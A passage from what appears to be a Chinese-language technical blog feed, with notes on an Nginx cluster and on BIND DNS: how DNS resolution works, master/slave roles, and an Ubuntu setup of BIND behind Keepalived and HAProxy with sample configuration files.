反向代理与负载均衡"></a>7.2.3. 进行 Ipv6 反向代理与负载均衡</h5><hr><h3 id="8-Nginx-集群架构"><a href="#8-Nginx-集群架构" class="headerlink" title="8. Nginx 集群架构"></a>8. Nginx 集群架构</h3><h4 id="8-1-集群架构图"><a href="#8-1-集群架构图" class="headerlink" title="8.1. 集群架构图"></a>8.1. 集群架构图</h4><pre class="mermaid">graph TD    subgraph 客户端        用户请求 --> Nginx    end    subgraph Nginx 集群        Nginx --> Nginx1_master        Nginx --> Nginx2_slave        Nginx --> Nginx3_slave    end    subgraph 服务集群        Nginx1_master --> Redis集群        Nginx2_slave --> Redis集群        Nginx3_slave --> Redis集群        Redis集群 --> Redis1        Redis集群 --> Redis2                Nginx1_master --> Kafka集群        Nginx2_slave --> Kafka集群        Nginx3_slave --> Kafka集群        Kafka集群 --> Kafka1        Kafka集群 --> Kafka2    end</pre><hr><h1 id="三、补充"><a href="#三、补充" class="headerlink" title="三、补充"></a>三、补充</h1><h3 id="1-正向代理"><a href="#1-正向代理" class="headerlink" title="1. 正向代理"></a>1. 正向代理</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ANginx%20%E5%9F%BA%E7%A1%80/image-20250324224254092.png"></p><hr><h3 id="2-反向代理"><a href="#2-反向代理" class="headerlink" title="2. 反向代理"></a>2. 反向代理</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ANginx%20%E5%9F%BA%E7%A1%80/image-20250324224326935.png"></p><hr><h3 id="3-负载均衡"><a href="#3-负载均衡" class="headerlink" title="3. 负载均衡"></a>3. 负载均衡</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ANginx%20%E5%9F%BA%E7%A1%80/image-20250324224404448.png"></p><hr><h3 id="4-查看-CPU-核心数"><a href="#4-查看-CPU-核心数" class="headerlink" title="4. 查看 CPU 核心数"></a>4. 查看 CPU 核心数</h3><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-meta"># 1. Windows（需要使用 PowerShell）</span><br>Get-WmiObject -<span class="hljs-keyword">Class</span> <span class="hljs-title class_">Win32_Processor</span> | <span class="hljs-keyword">Select</span>-Object NumberOfCores<span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"># 2. Linux</span><br>nproc<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网关与负载均衡</category>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：BIND DNS</title>
    <link href="/2025/03/18/%E7%AC%94%E8%AE%B0%EF%BC%9ABIND%20DNS/"/>
    <url>/2025/03/18/%E7%AC%94%E8%AE%B0%EF%BC%9ABIND%20DNS/</url>
    
    <content type="html"><![CDATA[<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[应用层（HTTP、HTTPS、DNS 查询、代码指令）]</span><br>   ↑ ↓<br><span class="hljs-string">[传输层（TCP/UDP/Unix Socket）]</span><br>   ↑ ↓<br><span class="hljs-string">[网络层（IPv4/IPv6 分片、路由）]</span><br>   ↑ ↓<br><span class="hljs-string">[数据链路层（以太网帧 / WiFi 帧）]</span><br>   ↑ ↓<br><span class="hljs-string">[物理层（电流/光信号 / 无线电波）]</span><br></code></pre></td></tr></table></figure><h2 id="DNS-查询全链路剖析"><a href="#DNS-查询全链路剖析" class="headerlink" title="DNS 查询全链路剖析"></a>DNS 查询全链路剖析</h2><p>&#x3D;&#x3D;1.用户发起查询&#x3D;&#x3D;<br>当你在浏览器中输入一个域名（例如 <code>www.example.com</code>）时，浏览器需要将 <code>www.example.com</code> 解析成具体的 IP 地址，然后根据 IP 加 端口进行访问（HTTP 默认 80，HTTPS 默认 443）</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>HTTP 的默认端口是：80</li><li>HTTPS 的默认端口是：443</li></ol></blockquote><p>&#x3D;&#x3D;2.浏览器查看自己的 DNS缓存&#x3D;&#x3D;<br>浏览器内部会首先在内存中查找 DNS 缓存，如果该域名已经解析过且缓存未过期，则直接使用缓存结果返回，不再进行后续查询。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>若缓存保存在内存中（未持久化），当操作系统（电脑）关闭后，其内存中的 DNS 缓存就会被清空</li><li>Chrome 查询缓存就是存储在浏览器进程的内存中</li></ol></blockquote><p>&#x3D;&#x3D;3.操作系统检查 Hosts&#x3D;&#x3D;<br>若浏览器未在自己的内存中找到 DNS 缓存，它会向操作系统（OS）发出“解析请求”，在操作系统内部，最先被检查的是本地的 <code>Hosts</code> 文件（如 Linux 下的 <code>/etc/hosts</code>，Windows 下的 <code>C:\Windows\System32\drivers\etc\hosts</code>）</p><p>&#x3D;&#x3D;4.操作系统检查自己的 DNS 缓存&#x3D;&#x3D;<br>如果 Hosts 文件中没有匹配项，OS 会继续查看它自己维护的 DNS 缓存（由系统级缓存守护进程提供，如 macOS 的 mDNSResponder、Windows 的 DNS Client service，或 Linux 上常见的 systemd-resolved、nscd、dnsmasq 等）</p><p>&#x3D;&#x3D;5.操作系统向 DNS 服务器发起查询&#x3D;&#x3D;<br>以上都没命中的话，OS 才会根据 <code>/etc/resolv.conf</code> 或系统设置，准备向配置好的 DNS（如运营商 DNS、公共 DNS）发起真实的 UDP（或在必要时 TCP）查询，拿到结果后再缓存到系统级 DNS 缓存，最后返回给浏览器。</p><p>&#x3D;&#x3D;6.操作系统（应用层）构造 DNS 协议报文&#x3D;&#x3D;</p><p>假设你在网络配置中将 BIND DNS 服务器设置为首选 DNS（例如 IP 为 192.168.1.100），而将 Google 的 8.8.8.8 设置为备用 DNS，整个解析过程如下：</p><ol><li>&#x3D;&#x3D;用户发起查询&#x3D;&#x3D; ：<ol><li>当你在浏览器中输入一个域名（例如 <code>www.baidu.com</code>）时，浏览器开始向 DNS 系统发起解析请求。</li></ol></li><li>&#x3D;&#x3D;浏览器 DNS 缓存检查&#x3D;&#x3D;：<ol><li>浏览器内部会首先在内存中查找 DNS 缓存，如果该域名已经解析过且缓存未过期，则直接使用缓存结果返回，不再进行后续查询。</li><li>注意：浏览器关闭后，其内存中的 DNS 缓存就会清空。</li></ol></li><li>&#x3D;&#x3D;操作系统 DNS 缓存检查&#x3D;&#x3D;：<ol><li>如果浏览器缓存中没有有效记录，操作系统（例如 Linux、Windows、macOS）会检查系统级 DNS 缓存（通常存储在内存中）</li><li>注意：若缓存存储在内存中，操作系统关闭后，其内存中的 DNS 缓存就会被清空</li></ol></li><li>&#x3D;&#x3D;首选 DNS 服务器介入&#x3D;&#x3D;<ol><li>当本地缓存均未命中时，操作系统将查询请求发送给配置的首选 DNS 服务器，即你部署的 BIND DNS 服务器（通过 UDP 53 端口，必要时使用 TCP 53）</li><li><font color="#00b0f0">BIND DNS 缓存查找</font>：<ol><li>BIND 首先在自身的内存缓存中查找该域名的解析记录。如果有且未过期，立即返回给操作系统</li><li>如果配置了 <code>dump-file</code>（例如 <code>dump-file &quot;/var/named/data/cache_dump.db&quot;;</code>），BIND 会定期将内存中的缓存持久化到磁盘上，以便在重启后恢复缓存，但实际查询仍以内存数据为主</li></ol></li><li><font color="#00b0f0">进行权威解析</font>：<ol><li>BIND 检查自己是否为该域名（例如 <code>baidu.com</code>）的权威 DNS 服务器。如果 BIND 是权威服务器，则直接返回 <code>www.baidu.com</code> 对应的 IP 地址。</li><li>注意：通常，权威服务器由域名注册方（如<code>baidu.com</code> 是由百度公司）提供和管理，负责提供最终解析记录</li></ol></li><li><font color="#00b0f0">进行递归解析</font>：<ol><li>若 BIND 不是 <code>baidu.com</code> 的权威服务器，但配置了递归解析功能，则开始以下步骤：</li><li><font color="#7030a0">根服务器查询</font>：<ol><li>BIND 向全球仅有 13 组的根服务器发起查询，根服务器不保存具体 IP，而只返回顶级域（如 <code>.com</code> 或 <code>.cn</code>）的位置信息</li></ol></li><li><font color="#7030a0">TLD 查询</font>：<ol><li>根据根服务器的指示，BIND 向 <code>.com</code> 顶级域名服务器发出请求，询问 <code>baidu.com</code> 的权威 DNS 服务器的地址。</li><li>注意，TLD 服务器同样不存储具体 IP 地址，而是维护其下属二级域名（如 <code>baidu.com</code>、<code>google.com</code>）的权威 DNS 服务器地址，并指引查询请求前往对应的权威服务器获取最终解析结果。</li></ol></li><li><font color="#7030a0">权威服务器查询</font>：<ol><li>TLD 服务器返回 <code>baidu.com</code> 的权威服务器地址（如 <code>ns1.baidu.com</code>）后，BIND 再向该权威服务器发起查询，最终获得 <code>www.baidu.com</code> 的真实 IP 地址</li></ol></li><li><font color="#7030a0">缓存查询结果</font>：<ol><li>获得解析结果后，BIND 会将结果缓存在内存中（并按配置持久化到 <code>dump-file</code>，以便后续使用），然后返回给操作系统</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;备用 DNS 服务器介入&#x3D;&#x3D;：<ol><li>如果首选 DNS 服务器（你的 BIND）因超时或其它原因无法返回有效结果，操作系统会自动将查询请求转向备用 DNS 服务器，即 Google 的 8.8.8.8。</li><li>8.8.8.8 并非某个域名的权威服务器，而是一个高性能的递归 DNS 服务器集群，依托 Anycast 技术在全球部署。由于其庞大的用户基数，热门域名往往已被缓存，命中率极高，从而减少了向根服务器和 TLD 服务器逐级查询的需求。如果缓存中无匹配记录，8.8.8.8 将按照标准递归解析流程，从根服务器开始查询直至获取最终 IP 地址。</li></ol></li><li>&#x3D;&#x3D;返回解析结果&#x3D;&#x3D;：<ol><li><font color="#00b0f0">操作系统接受</font>：<ol><li>操作系统从首选或备用 DNS 获得域名对应的 IP 地址后，将结果返回给浏览器</li></ol></li><li><font color="#00b0f0">浏览器建立连接</font>：<ol><li>浏览器使用该 IP 地址与目标服务器建立 HTTP&#x2F;HTTPS 连接（通常是 80&#x2F;443 端口），进而加载网页内容</li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">Anycast 技术</font>：<ul><li>Google 在全球部署了数百个 8.8.8.8 服务器节点，并采用 <code>Anycast</code> 技术进行流量调度。当你访问 8.8.8.8 时，请求会自动路由到距离你最近的服务器节点。例如，在中国访问时，流量会被引导至亚洲的 Google DNS 集群，而在美国访问时，则会连接到北美的节点。这样可以避免解析请求跨国或跨大洲传输，从而大幅提升解析速度，降低网络延迟</li></ul></li><li><font color="#00b0f0">DNS 查询的本质</font>：<ul><li>简单来说，DNS 查询的流程是：首先检查缓存，如果缓存中有结果，则直接返回 IP 地址；如果缓存没有，就会通过其他方法找到该域名的权威 DNS 服务器，查询其区域记录。区域记录中会存储该域名的 IP 地址，查询到后即可返回该 IP 地址。</li></ul></li></ol></blockquote><h2 id="浏览器访问-HTTPS-网站的全链路剖析"><a href="#浏览器访问-HTTPS-网站的全链路剖析" class="headerlink" title="浏览器访问 HTTPS 网站的全链路剖析"></a>浏览器访问 HTTPS 网站的全链路剖析</h2><h3 id="网站服务器获取-HTTPS-证书"><a href="#网站服务器获取-HTTPS-证书" class="headerlink" title="网站服务器获取 HTTPS 证书"></a>网站服务器获取 HTTPS 证书</h3><hr><h3 id="用户向你的网站发起访问"><a href="#用户向你的网站发起访问" class="headerlink" title="用户向你的网站发起访问"></a>用户向你的网站发起访问</h3><p>用户访问你的网站（如 <code>https://www.example.com</code>），当用户在地址栏按下回车后，浏览器开始准备与 <code>www.example.com</code> 的 TCP 443 端口进行连接。</p><hr><h3 id="1-导图：Map：BIND-DNS"><a href="#1-导图：Map：BIND-DNS" class="headerlink" title="1. 导图：Map：BIND DNS"></a>1. 导图：<a href="../../maps/Map%EF%BC%9ABINDDNS.xmind">Map：BIND DNS</a></h3><hr><h3 id="2-DNS-解析全流程"><a href="#2-DNS-解析全流程" class="headerlink" title="2. DNS 解析全流程"></a>2. DNS 解析全流程</h3><p>假设你在网络配置中将 BIND DNS 服务器设置为首选 DNS（例如 IP 为 192.168.1.100），而将 Google 的 8.8.8.8 设置为备用 DNS，整个解析过程如下：</p><ol><li>&#x3D;&#x3D;用户发起查询&#x3D;&#x3D; ：<ol><li>当你在浏览器中输入一个域名（例如 <code>www.baidu.com</code>）时，浏览器开始向 DNS 系统发起解析请求。</li></ol></li><li>&#x3D;&#x3D;浏览器 DNS 缓存检查&#x3D;&#x3D;：<ol><li>浏览器内部会首先在内存中查找 DNS 缓存，如果该域名已经解析过且缓存未过期，则直接使用缓存结果返回，不再进行后续查询。</li><li>注意：浏览器关闭后，其内存中的 DNS 缓存就会清空。</li></ol></li><li>&#x3D;&#x3D;操作系统 DNS 缓存检查&#x3D;&#x3D;：<ol><li>如果浏览器缓存中没有有效记录，操作系统（例如 Linux、Windows、macOS）会检查系统级 DNS 缓存（通常存储在内存中）</li><li>注意：若缓存存储在内存中，操作系统关闭后，其内存中的 DNS 缓存就会被清空</li></ol></li><li>&#x3D;&#x3D;首选 DNS 服务器介入&#x3D;&#x3D;<ol><li>当本地缓存均未命中时，操作系统将查询请求发送给配置的首选 DNS 服务器，即你部署的 BIND DNS 服务器（通过 UDP 53 端口，必要时使用 TCP 53）</li><li><font color="#00b0f0">BIND DNS 缓存查找</font>：<ol><li>BIND 首先在自身的内存缓存中查找该域名的解析记录。如果有且未过期，立即返回给操作系统</li><li>如果配置了 <code>dump-file</code>（例如 <code>dump-file &quot;/var/named/data/cache_dump.db&quot;;</code>），BIND 会定期将内存中的缓存持久化到磁盘上，以便在重启后恢复缓存，但实际查询仍以内存数据为主</li></ol></li><li><font color="#00b0f0">进行权威解析</font>：<ol><li>BIND 检查自己是否为该域名（例如 <code>baidu.com</code>）的权威 DNS 服务器。如果 BIND 是权威服务器，则直接返回 <code>www.baidu.com</code> 对应的 IP 地址。</li><li>注意：通常，权威服务器由域名注册方（如<code>baidu.com</code> 是由百度公司）提供和管理，负责提供最终解析记录</li></ol></li><li><font color="#00b0f0">进行递归解析</font>：<ol><li>若 BIND 不是 <code>baidu.com</code> 的权威服务器，但配置了递归解析功能，则开始以下步骤：</li><li><font color="#7030a0">根服务器查询</font>：<ol><li>BIND 向全球仅有 13 组的根服务器发起查询，根服务器不保存具体 IP，而只返回顶级域（如 <code>.com</code> 或 <code>.cn</code>）的位置信息</li></ol></li><li><font color="#7030a0">TLD 查询</font>：<ol><li>根据根服务器的指示，BIND 向 <code>.com</code> 顶级域名服务器发出请求，询问 <code>baidu.com</code> 的权威 DNS 服务器的地址。</li><li>注意，TLD 服务器同样不存储具体 IP 地址，而是维护其下属二级域名（如 <code>baidu.com</code>、<code>google.com</code>）的权威 DNS 服务器地址，并指引查询请求前往对应的权威服务器获取最终解析结果。</li></ol></li><li><font color="#7030a0">权威服务器查询</font>：<ol><li>TLD 服务器返回 <code>baidu.com</code> 的权威服务器地址（如 <code>ns1.baidu.com</code>）后，BIND 再向该权威服务器发起查询，最终获得 <code>www.baidu.com</code> 的真实 IP 地址</li></ol></li><li><font color="#7030a0">缓存查询结果</font>：<ol><li>获得解析结果后，BIND 会将结果缓存在内存中（并按配置持久化到 <code>dump-file</code>，以便后续使用），然后返回给操作系统</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;备用 DNS 服务器介入&#x3D;&#x3D;：<ol><li>如果首选 DNS 服务器（你的 BIND）因超时或其它原因无法返回有效结果，操作系统会自动将查询请求转向备用 DNS 服务器，即 Google 的 8.8.8.8。</li><li>8.8.8.8 并非某个域名的权威服务器，而是一个高性能的递归 DNS 服务器集群，依托 Anycast 技术在全球部署。由于其庞大的用户基数，热门域名往往已被缓存，命中率极高，从而减少了向根服务器和 TLD 服务器逐级查询的需求。如果缓存中无匹配记录，8.8.8.8 将按照标准递归解析流程，从根服务器开始查询直至获取最终 IP 地址。</li></ol></li><li>&#x3D;&#x3D;返回解析结果&#x3D;&#x3D;：<ol><li><font color="#00b0f0">操作系统接受</font>：<ol><li>操作系统从首选或备用 DNS 获得域名对应的 IP 地址后，将结果返回给浏览器</li></ol></li><li><font color="#00b0f0">浏览器建立连接</font>：<ol><li>浏览器使用该 IP 地址与目标服务器建立 HTTP&#x2F;HTTPS 连接（通常是 80&#x2F;443 端口），进而加载网页内容</li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">Anycast 技术</font>：<ul><li>Google 在全球部署了数百个 8.8.8.8 服务器节点，并采用 <code>Anycast</code> 技术进行流量调度。当你访问 8.8.8.8 时，请求会自动路由到距离你最近的服务器节点。例如，在中国访问时，流量会被引导至亚洲的 Google DNS 集群，而在美国访问时，则会连接到北美的节点。这样可以避免解析请求跨国或跨大洲传输，从而大幅提升解析速度，降低网络延迟</li></ul></li><li><font color="#00b0f0">DNS 查询的本质</font>：<ul><li>简单来说，DNS 查询的流程是：首先检查缓存，如果缓存中有结果，则直接返回 IP 地址；如果缓存没有，就会通过其他方法找到该域名的权威 DNS 服务器，查询其区域记录。区域记录中会存储该域名的 IP 地址，查询到后即可返回该 IP 地址。</li></ul></li></ol></blockquote><hr><h3 id="3-BIND-DNS-概述"><a href="#3-BIND-DNS-概述" class="headerlink" title="3. BIND DNS 概述"></a>3. BIND DNS 概述</h3><p>BIND（Berkeley Internet Name Domain）是互联网上最常用的 DNS 服务器软件之一。BIND作为DNS服务器，支持多种DNS功能，包括但不限于：</p><ol><li><font color="#00b0f0">正向解析</font>：BIND 负责将域名（如 <code>www.example.com</code>）转换为 IP 地址（如 <code>192.0.2.1</code>），这是用户访问网站时的关键步骤。</li><li><font color="#00b0f0">反向解析</font>：BIND 还支持执行反向DNS查询，即将IP地址映射回相应的域名。例如，查询<code>192.0.2.1</code>对应的域名是什么。</li><li><font color="#00b0f0">递归查询</font>：BIND 可以作为递归 DNS 服务器运行，这意味着当收到一个它没有存储记录的域名查询请求时，它会代替客户端向其他DNS服务器发起查询，并通过一系列查询获取最终的域名解析结果返回给客户端</li><li><font color="#00b0f0">可作为权威服务器</font>：可以作为某个域名的权威服务器（权威服务器是指拥有该域名记录最终解析权的服务器，通常由域名注册商提供。当你需要解析该域名时，要么将该域名的权威服务器设置为首选 DNS 服务器，直接由其返回解析结果；要么通过递归解析，从根节点-&gt;.com-&gt;权威服务器，最终由其返回解析结果。）</li></ol><hr><h3 id="4-BIND-DNS-组件"><a href="#4-BIND-DNS-组件" class="headerlink" title="4. BIND DNS 组件"></a>4. BIND DNS 组件</h3><p>我们说 BIND DNS 实际上就是指的 BIND DNS 集群，其组件分 Master 节点和 Slave 节点：</p><ol><li>&#x3D;&#x3D;Master 节点&#x3D;&#x3D;<ol><li>作为域名的权威 DNS 服务器，负责存储和维护 DNS 区域文件，并将数据同步给从服务器（权威、读写）</li></ol></li><li>&#x3D;&#x3D;Slave 节点&#x3D;&#x3D;<ol><li>接受和同步主服务器的区域文件，可为域名提供权威回答（权威、读）</li><li>尽管从服务器未被设置为权威 DNS 服务器，但只要成功同步了区域文件，它在响应该区域内的查询时会设置 AA（权威应答）标志，表明其回答是权威的</li><li>注意：如果 Master 挂了，Slave 能继续提供查询服务，但可能会因数据过期而导致部分解析失败</li></ol></li></ol><hr><h3 id="5-BIND-DNS-最佳实践"><a href="#5-BIND-DNS-最佳实践" class="headerlink" title="5. BIND DNS 最佳实践"></a>5. BIND DNS 最佳实践</h3><h4 id="5-1-高可用实现"><a href="#5-1-高可用实现" class="headerlink" title="5.1. 高可用实现"></a>5.1. 高可用实现</h4><ol><li>&#x3D;&#x3D;主从之间&#x3D;&#x3D;<ol><li>主从服务器采用主从复制架构，确保主服务器与从服务器之间的数据同步。</li><li>BIND DNS 不支持从服务器提升为主服务器（Slave to Master）</li></ol></li><li>&#x3D;&#x3D;主主之间&#x3D;&#x3D;：<ol><li>BIND DNS 不支持自动的信息同步，也不支持双向复制。为了保持多个主服务器的数据一致性，需要手动配置每个主服务器的区域文件，或使用第三方工具进行文件同步。</li><li>BIND DNS 不会在主服务器之间进行 leader 选举</li></ol></li><li>&#x3D;&#x3D;负载均衡&#x3D;&#x3D;：<ol><li>需要配置负载均衡和反向代理，使得在主 DNS 配置中，仅需将反向代理服务器的 IP 地址设置为外部访问入口。</li></ol></li></ol><hr><h4 id="5-2-架构图"><a href="#5-2-架构图" class="headerlink" title="5.2. 架构图"></a>5.2. 架构图</h4><pre class="mermaid">graph TD        A["用户请求"] --> B["VIP(192.168.136.100)"]        B -->|"VIP 在 Haproxy 上漂移"| C["Haproxy 集群"]        C --> C1["Haproxy1(192.168.136.14)"]        C --> C2["Haproxy2(192.168.136.15)"]        C1 --> |"负载均衡"| D1["BIND DNS1(192.168.136.49)"]        C1 --> |"负载均衡"| D2["BIND DNS1(192.168.136.51)"]        C2 --> |"负载均衡"| D1["BIND DNS1(192.168.136.49)"]        C2 --> |"负载均衡"| D2["BIND DNS1(192.168.136.51)"]</pre><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><h4 id="1-1-节点规划"><a href="#1-1-节点规划" class="headerlink" title="1.1. 节点规划"></a>1.1. 节点规划</h4><table><thead><tr><th>IP</th><th>主机名</th></tr></thead><tbody><tr><td>192.168.136.49</td><td>DNS1</td></tr><tr><td>192.168.136.51</td><td>DNS2</td></tr><tr><td>192.168.136.12</td><td>DNS-keepalived1</td></tr><tr><td>192.168.136.13</td><td>DNS-keepalived2</td></tr><tr><td>192.168.136.14</td><td>DNS-haproxy1</td></tr><tr><td>192.168.136.15</td><td>DNS-haproxy2</td></tr></tbody></table><hr><h4 id="1-2-DNS-节点环境准备"><a href="#1-2-DNS-节点环境准备" class="headerlink" title="1.2. DNS 节点环境准备"></a>1.2. DNS 节点环境准备</h4><p>主从服务器上都需要安装 <code>BIND DNS</code>，以下是基于 <code>Ubuntu</code> 系统中安装 <code>BIND DNS</code> 步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 BIND DNS</span><br><span class="hljs-built_in">sudo</span> apt install bind9 bind9utils bind9-doc<br><br><br><span class="hljs-comment"># 2. 启动 BIND DNS 服务</span><br><span class="hljs-built_in">sudo</span> systemctl start bind9<br><br><br><span class="hljs-comment"># 3. 设置 BIND DNS 开机自启动</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> bind9<br><br><br><span class="hljs-comment"># 4. 查看 BIND DNS 状态</span><br><span class="hljs-built_in">sudo</span> systemctl status bind9<br><br><br><span class="hljs-comment"># 5. 开放 BIND DNS 端口（默认53）</span><br><span class="hljs-built_in">sudo</span> ufw allow dns<br><br><br><span class="hljs-comment"># 6. 重新加载防火墙规则以使其生效</span><br><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">enable</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-3-Keepalived-节点环境准备"><a href="#1-3-Keepalived-节点环境准备" class="headerlink" title="1.3. Keepalived 节点环境准备"></a>1.3. Keepalived 节点环境准备</h4><p>Keepalived 节点无需任何准备，进行完 Ubuntu 初始化即可，但是 Keepalived 绑定 VIP 的服务器（Haproxy），必须进行下面的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install -y conntrack libseccomp2<br></code></pre></td></tr></table></figure><hr><h4 id="1-4-Haproxy-节点环境准备"><a href="#1-4-Haproxy-节点环境准备" class="headerlink" title="1.4. Haproxy 节点环境准备"></a>1.4. Haproxy 节点环境准备</h4><p>Haproxy 节点无需任何准备，进行完 Ubuntu 初始化即可</p><hr><h3 id="2-部署-Keepalived-集群"><a href="#2-部署-Keepalived-集群" class="headerlink" title="2. 部署 Keepalived 集群"></a>2. 部署 Keepalived 集群</h3><p>&#x3D;&#x3D;1.安装 Keepalived&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install -y keepalived<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.编辑配置文件&#x3D;&#x3D;</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># <span class="hljs-number">1.</span> 编辑 Keepalived 配置文件<br>sudo vim /etc/keepalived/keepalived.conf<br><br><br># <span class="hljs-number">2.</span> 添加以下内容<br>vrrp_script chk_haproxy1 &#123;<br>    script <span class="hljs-string">&quot;/bin/bash -c &#x27;echo &gt; /dev/tcp/192.168.136.14/16443&#x27;&quot;</span><br>    <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span><br>    weight <span class="hljs-number">-2</span><br>&#125;<br><br>vrrp_script chk_haproxy2 &#123;<br>    script <span class="hljs-string">&quot;/bin/bash -c &#x27;echo &gt; /dev/tcp/192.168.136.15/16443&#x27;&quot;</span><br>    <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span><br>    weight <span class="hljs-number">-2</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state MASTER                               # 主就写 Master，从就写 BACKUP<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span>                               # 主就写 <span class="hljs-symbol">100</span>，从就稍微低点 <span class="hljs-symbol">90</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass wq666666<br>    &#125;<br><br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.100</span>/<span class="hljs-number">24</span><br>    &#125;<br><br>    track_script &#123;<br>        chk_haproxy1<br>        chk_haproxy2<br>    &#125;<br>&#125;<br><br><br># <span class="hljs-number">3.</span> 重启和开机自启动 Keepalived<br>sudo systemctl start keepalived &amp;&amp; sudo systemctl enable keepalived<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Keepalived 状态&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status keepalived<br></code></pre></td></tr></table></figure><hr><h3 id="3-部署-Haproxy-集群"><a href="#3-部署-Haproxy-集群" class="headerlink" title="3. 部署 Haproxy 集群"></a>3. 部署 Haproxy 集群</h3><p>&#x3D;&#x3D;1.安装 Haproxy&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install -y haproxy<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.配置配置文件&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 